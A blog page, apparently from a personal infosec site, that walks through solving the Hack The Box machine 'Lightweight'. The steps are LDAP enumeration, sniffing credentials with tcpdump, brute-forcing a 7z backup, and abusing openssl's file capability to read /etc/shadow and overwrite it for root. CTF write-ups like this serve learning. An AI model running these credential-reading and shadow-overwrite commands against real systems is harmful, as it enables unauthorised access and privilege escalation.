@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Lightweight | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Lightweight" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &lt;dc=lightweight,dc=htb&gt; with scope subtree filter: (objectclass=*) requesting: ALL #" />
+<meta property="og:description" content="Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &lt;dc=lightweight,dc=htb&gt; with scope subtree filter: (objectclass=*) requesting: ALL #" />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/lightweight/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/lightweight/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/lightweight/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-05-11T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Lightweight","dateModified":"2019-05-11T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/lightweight/","datePublished":"2019-05-11T00:00:00+02:00","image":"http://localhost:4000/hackthebox/lightweight/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/lightweight/"},"description":"Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &lt;dc=lightweight,dc=htb&gt; with scope subtree filter: (objectclass=*) requesting: ALL #","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Lightweight</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-05-11T00:00:00+02:00" itemprop="datePublished">May 11, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-today-lightweight-retired-and-heres-my-write-up-about-it-lightweight-was-a-simple-and-a-straightforward-machine-i-had-fun-solving-it-and-i-liked-it-the-idea-behind-the-box-is-simple-we-get-initial-ssh-access-then-keep-escalating-privileges-until-we-reach-root-its-a-linux-machine-and-its-ip-is-101010119-i-added-it-to-etchosts-as-lightweighthtb-lets-jump-right-in">Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is <code class="highlighter-rouge">10.10.10.119</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">lightweight.htb</code>. Let’s jump right in.</h4>
+<p><img src="/images/hackthebox/lightweight/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC lightweight.htb</code>
+<img src="/images/hackthebox/lightweight/1.png" alt="" /></p>
+<h4 id="3-ports-are-open--22-running-ssh-80-running-http-and-389-running-ldap-lets-check-ldap-first">3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="ldap-enumeration">Ldap Enumeration</h3>
+<h4 id="to-enumerate-ldap-i-like-to-use-a-tool-called-ldapsearch-theres-also-an-nmap-script-called-ldap-search-that-can-do-the-same-thing">To enumerate ldap I like to use a tool called <code class="highlighter-rouge">ldapsearch</code>, There’s also an <code class="highlighter-rouge">nmap</code> script called <code class="highlighter-rouge">ldap-search</code> that can do the same thing.</h4>
+<h4 id="ldapsearch-"><code class="highlighter-rouge">ldapsearch</code> :</h4>
+<p><code class="highlighter-rouge">ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"</code></p>
+<h4 id="full-output-">Full Output :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extended LDIF
+#
+# LDAPv3
+# base &lt;dc=lightweight,dc=htb&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# lightweight.htb
+dn: dc=lightweight,dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: lightweight htb
+dc: lightweight
+
+# Manager, lightweight.htb
+dn: cn=Manager,dc=lightweight,dc=htb
+objectClass: organizationalRole
+cn: Manager
+description: Directory Manager
+
+# People, lightweight.htb
+dn: ou=People,dc=lightweight,dc=htb
+objectClass: organizationalUnit
+ou: People
+
+# Group, lightweight.htb
+dn: ou=Group,dc=lightweight,dc=htb
+objectClass: organizationalUnit
+ou: Group
+
+# ldapuser1, People, lightweight.htb
+dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
+uid: ldapuser1
+cn: ldapuser1
+sn: ldapuser1
+mail: ldapuser1@lightweight.htb
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: top
+objectClass: shadowAccount
+userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
+ oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
+shadowLastChange: 17691
+shadowMin: 0
+shadowMax: 99999
+shadowWarning: 7
+loginShell: /bin/bash
+uidNumber: 1000
+gidNumber: 1000
+homeDirectory: /home/ldapuser1
+
+# ldapuser2, People, lightweight.htb
+dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+uid: ldapuser2
+cn: ldapuser2
+sn: ldapuser2
+mail: ldapuser2@lightweight.htb
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: top
+objectClass: shadowAccount
+userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
+ zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
+shadowLastChange: 17691
+shadowMin: 0
+shadowMax: 99999
+shadowWarning: 7
+loginShell: /bin/bash
+uidNumber: 1001
+gidNumber: 1001
+homeDirectory: /home/ldapuser2
+
+# ldapuser1, Group, lightweight.htb
+dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: ldapuser1
+userPassword:: e2NyeXB0fXg=
+gidNumber: 1000
+
+# ldapuser2, Group, lightweight.htb
+dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: ldapuser2
+userPassword:: e2NyeXB0fXg=
+gidNumber: 1001
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 9
+# numEntries: 8
+
+</code></pre></div></div>
+<h4 id="nmap-"><code class="highlighter-rouge">nmap</code> :</h4>
+<p><code class="highlighter-rouge">nmap --script=ldap-search lightweight.htb</code></p>
+<h4 id="full-output--1">Full Output :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
+Nmap scan report for lightweight.htb (10.10.10.119)
+Host is up (0.17s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=lightweight,dc=htb
+|     dn: dc=lightweight,dc=htb
+|         objectClass: top
+|         objectClass: dcObject
+|         objectClass: organization
+|         o: lightweight htb
+|         dc: lightweight
+|     dn: cn=Manager,dc=lightweight,dc=htb
+|         objectClass: organizationalRole
+|         cn: Manager
+|         description: Directory Manager
+|     dn: ou=People,dc=lightweight,dc=htb
+|         objectClass: organizationalUnit
+|         ou: People
+|     dn: ou=Group,dc=lightweight,dc=htb
+|         objectClass: organizationalUnit
+|         ou: Group
+|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
+|         uid: ldapuser1
+|         cn: ldapuser1
+|         sn: ldapuser1
+|         mail: ldapuser1@lightweight.htb
+|         objectClass: person
+|         objectClass: organizationalPerson
+|         objectClass: inetOrgPerson
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: shadowAccount
+|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
+|         shadowLastChange: 17691
+|         shadowMin: 0
+|         shadowMax: 99999
+|         shadowWarning: 7
+|         loginShell: /bin/bash
+|         uidNumber: 1000
+|         gidNumber: 1000
+|         homeDirectory: /home/ldapuser1
+|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+|         uid: ldapuser2
+|         cn: ldapuser2
+|         sn: ldapuser2
+|         mail: ldapuser2@lightweight.htb
+|         objectClass: person
+|         objectClass: organizationalPerson
+|         objectClass: inetOrgPerson
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: shadowAccount
+|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
+|         shadowLastChange: 17691
+|         shadowMin: 0
+|         shadowMax: 99999
+|         shadowWarning: 7
+|         loginShell: /bin/bash
+|         uidNumber: 1001
+|         gidNumber: 1001
+|         homeDirectory: /home/ldapuser2
+|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: ldapuser1
+|         userPassword: {crypt}x
+|         gidNumber: 1000
+|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: ldapuser2
+|         userPassword: {crypt}x
+|_        gidNumber: 1001
+
+# Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds
+
+</code></pre></div></div>
+<h4 id="if-we-take-a-look-at-ldapsearch-results-">If we take a look at <code class="highlighter-rouge">ldapsearch</code> results :</h4>
+<p><img src="/images/hackthebox/lightweight/2.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/lightweight/3.png" alt="" /></p>
+<h4 id="we-have-some-info-for-2-users--ldapuser1-and-ldapuser2-userpassword-is-a-base64-encoded-string-i-decoded-it-and-got-the-same-hashes-i-got-from-ldap-search-nmap-script-">We have some info for 2 users : <code class="highlighter-rouge">ldapuser1</code> and <code class="highlighter-rouge">ldapuser2</code>. <code class="highlighter-rouge">userPassword</code> is a base64 encoded string. I decoded it and got the same hashes I got from <code class="highlighter-rouge">ldap-search</code> <code class="highlighter-rouge">nmap</code> script :</h4>
+<p><img src="/images/hackthebox/lightweight/4.png" alt="" /></p>
+<h4 id="however-i-tried-to-crack-the-hashes-and-they-didnt-crack-lets-check-http">However, I tried to crack the hashes and they didn’t crack. Let’s check http.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http">HTTP</h3>
+<h4 id="usually-i-use-some-tools-for-web-like-gobuster-for-example-but-this-time-we-cant-do-that-because-we-will-get-blocked-as-you-can-see-">Usually I use some tools for web like <code class="highlighter-rouge">gobuster</code> for example, But this time We can’t do that because we will get blocked as you can see :</h4>
+<p><img src="/images/hackthebox/lightweight/5.png" alt="" /></p>
+<h4 id="also-the-info-page-is-saying-the-same-thing-">Also the <code class="highlighter-rouge">info</code> page is saying the same thing :</h4>
+<p><img src="/images/hackthebox/lightweight/6.png" alt="" /></p>
+<h4 id="and-its-also-saying-if-you-like-to-get-in-the-box-please-go-to-the-user-page-lets-check-user-">And it’s also saying <code class="highlighter-rouge">If you like to get in the box, please go to the user page</code>. Let’s check <code class="highlighter-rouge">user</code> :</h4>
+<p><img src="/images/hackthebox/lightweight/7.png" alt="" /></p>
+<h4 id="so-we-can-login-with-ssh-with-the-ip-as-the-username-and-the-password-lets-try-">So we can login with ssh with the ip as the username and the password. Let’s try :</h4>
+<p><img src="/images/hackthebox/lightweight/8.png" alt="" /></p>
+<h4 id="its-working-">It’s working !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="tcpdump-capabilities-user-flag">Tcpdump Capabilities, User Flag</h3>
+<h4 id="one-of-the-things-i-always-check-when-enumerating-linux-filesystem-is-the-binary-capabilities-so-i-used-getcap-on-some-directories-like-bin-usrbin-and-usrsbin-i-noticed-that-tcpdump-has-cap_net_admincap_net_rawep-capabilities">One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used <code class="highlighter-rouge">getcap</code> on some directories like <code class="highlighter-rouge">/bin</code>, <code class="highlighter-rouge">/usr/bin</code> and <code class="highlighter-rouge">/usr/sbin</code>. I noticed that <code class="highlighter-rouge">tcpdump</code> has <code class="highlighter-rouge">cap_net_admin,cap_net_raw+ep</code> capabilities.</h4>
+<p><img src="/images/hackthebox/lightweight/9.png" alt="" /></p>
+<h4 id="from-the-linux-capabilities-manual-i-found-some-info-about-these-capabilities-">From the <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">Linux Capabilities Manual</a> I found some info about these capabilities :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**CAP_NET_ADMIN**
+              Perform various network-related operations:
+              * interface configuration;
+              * administration of IP firewall, masquerading, and accounting;
+              * modify routing tables;
+              * bind to any address for transparent proxying;
+              * set type-of-service (TOS)
+              * clear driver statistics;
+              * set promiscuous mode;
+              * enabling multicasting;
+              * use [setsockopt(2)](http://man7.org/linux/man-pages/man2/setsockopt.2.html) to set the following socket options:
+                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the
+                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.
+</code></pre></div></div>
+<p><br /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> **CAP_NET_RAW**
+              * Use RAW and PACKET sockets;
+              * bind to any address for transparent proxying.
+</code></pre></div></div>
+<h4 id="great-i-ran-tcpdump-on-all-the-interfaces-and-saved-the-output-to-capturedpcap-and-i-left-it-for-some-time-">Great. I ran <code class="highlighter-rouge">tcpdump</code> on all the interfaces and saved the output to <code class="highlighter-rouge">captured.pcap</code> and I left it for some time :</h4>
+<p><code class="highlighter-rouge">tcpdump -i any -w captured.pcap</code>
+<img src="/images/hackthebox/lightweight/10.png" alt="" /></p>
+<h4 id="i-downloaded-the-pcap-on-my-box-to-open-it-with-wireshark-">I downloaded the <code class="highlighter-rouge">pcap</code> on my box to open it with <code class="highlighter-rouge">wireshark</code> :</h4>
+<p><code class="highlighter-rouge">scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./</code>
+<img src="/images/hackthebox/lightweight/11.png" alt="" /></p>
+<h4 id="in-wireshark-i-noticed-an-ldap-request-">In <code class="highlighter-rouge">wireshark</code> I noticed an <code class="highlighter-rouge">LDAP</code> request :</h4>
+<p><img src="/images/hackthebox/lightweight/12.png" alt="" /></p>
+<h4 id="i-looked-at-it-and-found-that-its-an-authentication-request-">I looked at it and found that it’s an authentication request :</h4>
+<p><img src="/images/hackthebox/lightweight/13.png" alt="" /></p>
+<h4 id="now-we-have-the-password-for-ldapuser2--8bc8251332abe1d7f105d3e53ad39ac2-lets-su-">Now we have the password for <code class="highlighter-rouge">ldapuser2</code> :	<code class="highlighter-rouge">8bc8251332abe1d7f105d3e53ad39ac2</code>. Lets <code class="highlighter-rouge">su</code> :</h4>
+<p><img src="/images/hackthebox/lightweight/14.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/lightweight/15.png" alt="" /></p>
+<h4 id="we-owned-user">We owned user.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="bruteforcing-7z-hardcoded-credentials-privilege-escalation-to-ldapuser1">Bruteforcing <code class="highlighter-rouge">7z</code>, Hardcoded Credentials, Privilege Escalation to <code class="highlighter-rouge">ldapuser1</code></h3>
+<h4 id="in-the-home-directory-of-ldapuser2-there-was-a-backup-file-called-backup7z-i-tried-to-extract-it-but-it-was-password-protected-">In the <code class="highlighter-rouge">/home</code> directory of <code class="highlighter-rouge">ldapuser2</code> there was a backup file called <code class="highlighter-rouge">backup.7z</code>. I tried to extract it but it was password protected :</h4>
+<p><img src="/images/hackthebox/lightweight/16.png" alt="" /></p>
+<h4 id="so-i-transferred-it-to-my-box-to-bruteforce-it-nc-wasnt-installed-and-i-couldnt-use-scp-so-i-transferred-it-with-base64-encodingdecoding-">So I transferred it to my box to bruteforce it (<code class="highlighter-rouge">nc</code> wasn’t installed and I couldn’t use <code class="highlighter-rouge">scp</code> so I transferred it with base64 encoding/decoding) :</h4>
+<p><img src="/images/hackthebox/lightweight/17.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/lightweight/18.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/lightweight/19.png" alt="" /></p>
+<h4 id="i-used-this-tool-to-bruteforce-the-7z-file-">I used <a href="https://github.com/Seyptoo/7z-BruteForce">this tool</a> to bruteforce the <code class="highlighter-rouge">7z</code> file :</h4>
+<p><code class="highlighter-rouge">python 7z.py backup.7z /usr/share/wordlists/rockyou.txt</code>
+<img src="/images/hackthebox/lightweight/20.png" alt="" /></p>
+<h4 id="the-password-is-delete-after-extraction-we-have-some-php-files-looks-like-the-source-of-the-web-site-hosted-on-port-80-">The password is <code class="highlighter-rouge">delete</code>. After extraction we have some <code class="highlighter-rouge">php</code> files, Looks like the source of the web site hosted on port 80 :</h4>
+<p><img src="/images/hackthebox/lightweight/21.png" alt="" /></p>
+<h4 id="i-checked-them-all-and-in-statusphp-i-found-hardcoded-credentials-for-ldapuser1-">I checked them all and in <code class="highlighter-rouge">status.php</code> I found hardcoded credentials for <code class="highlighter-rouge">ldapuser1</code> :</h4>
+<p><img src="/images/hackthebox/lightweight/22.png" alt="" /></p>
+<h4 id="now-we-can-su-to-ldapuser1-with-the-password--f3ca9d298a553da117442deeb6fa932d-">Now we can <code class="highlighter-rouge">su</code> to <code class="highlighter-rouge">ldapuser1</code> with the password : <code class="highlighter-rouge">f3ca9d298a553da117442deeb6fa932d</code> :</h4>
+<p><img src="/images/hackthebox/lightweight/23.png" alt="" /></p>
+<hr />
+
+<h3 id="openssl-capabilities-root-flag">Openssl Capabilities, Root Flag</h3>
+<h4 id="i-looked-at-the-contents-of-homeldapuser1-and-i-noticed-some-stuff-a-php-file-called-ldaptlsphp-and-two-binaries--openssl-and-tcpdump">I looked at the contents of <code class="highlighter-rouge">/home/ldapuser1</code> and I noticed some stuff. A <code class="highlighter-rouge">php</code> file called <code class="highlighter-rouge">ldapTLS.php</code> and two binaries : <code class="highlighter-rouge">openssl</code> and <code class="highlighter-rouge">tcpdump</code>.</h4>
+<p><img src="/images/hackthebox/lightweight/24.png" alt="" />
+<br />
+<code class="highlighter-rouge">cat ldapTLS.php</code>
+<img src="/images/hackthebox/lightweight/25.png" alt="" /></p>
+<h4 id="nothing-interesting-lets-check-the-binaries-we-dont-need-tcpdump-anymore-so-we-will-focus-on-openssl">Nothing interesting. Lets check the binaries. (We don’t need <code class="highlighter-rouge">tcpdump</code> anymore so we will focus on <code class="highlighter-rouge">openssl</code>)</h4>
+<h4 id="i-checked-the-capabilities-and-i-found-that-openssl-has-the-ep-capability-which-means-it-can-read-and-write-anything-on-the-filesystem">I checked the capabilities and I found that <code class="highlighter-rouge">openssl</code> has the <code class="highlighter-rouge">ep</code> capability which means it can read and write anything on the filesystem.</h4>
+<p><img src="/images/hackthebox/lightweight/26.png" alt="" /></p>
+<h4 id="this--means-that-we-can-simply-read-the-root-flag-by-using-the-base64-encoding-function-in-openssl-then-decoding-the-file-">This  means that we can simply read the root flag by using the base64 encoding function in <code class="highlighter-rouge">openssl</code> then decoding the file :</h4>
+<p><code class="highlighter-rouge">./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64</code>
+<br />
+<br />
+<code class="highlighter-rouge">base64 -d root.txt.b64</code>
+<img src="/images/hackthebox/lightweight/27.png" alt="" /></p>
+<h4 id="we-can-also-get-a-root-shell-by-overwriting-etcpasswd-or-etcshadow-i-got-a-copy-of-the-original-shadow-file-first-">We can also get a root shell by overwriting <code class="highlighter-rouge">/etc/passwd</code> or <code class="highlighter-rouge">/etc/shadow</code>. I got a copy of the original <code class="highlighter-rouge">shadow</code> file first :</h4>
+<p><code class="highlighter-rouge">./openssl enc -base64 -in /etc/shadow -out ./shadow.b64</code>
+<br />
+<br />
+<code class="highlighter-rouge">base64 -d shadow.b64 &gt; shadow</code>
+<br />
+<br />
+<img src="/images/hackthebox/lightweight/28.png" alt="" /></p>
+<h4 id="i-used-openssl-to-create-a-salted-password-i-used-root-as-the-salt-and-rick-as-the-password-">I used <code class="highlighter-rouge">openssl</code> to create a salted password. I used <code class="highlighter-rouge">root</code> as the salt and <code class="highlighter-rouge">rick</code> as the password :</h4>
+<p><code class="highlighter-rouge">openssl passwd -1 -salt root rick</code>
+<img src="/images/hackthebox/lightweight/29.png" alt="" /></p>
+<h4 id="then-i-edited-the-copy-i-have-of-etcshadow-and-replaced-the-root-password-with-the-new-one-">Then I edited the copy I have of <code class="highlighter-rouge">/etc/shadow</code> and replaced the root password with the new one :</h4>
+<p><img src="/images/hackthebox/lightweight/30.png" alt="" /></p>
+<h4 id="and-finally-i-used-openssl-to-replace-the-old-etcshadow-with-the-new-one-and-after-that-we-can-do-su-root-with-the-password-rick">And finally I used <code class="highlighter-rouge">openssl</code> to replace the old <code class="highlighter-rouge">/etc/shadow</code> with the new one and after that we can do <code class="highlighter-rouge">su root</code> with the password <code class="highlighter-rouge">rick</code>:</h4>
+<p><code class="highlighter-rouge">./openssl enc -in shadow -out /etc/shadow</code>
+<img src="/images/hackthebox/lightweight/31.png" alt="" /></p>
+<h4 id="and-we-owned-root-">And we owned root !</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---bighead">Previous Hack The Box write-up : <a href="/hack-the-box/bighead/">Hack The Box - BigHead</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/lightweight/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
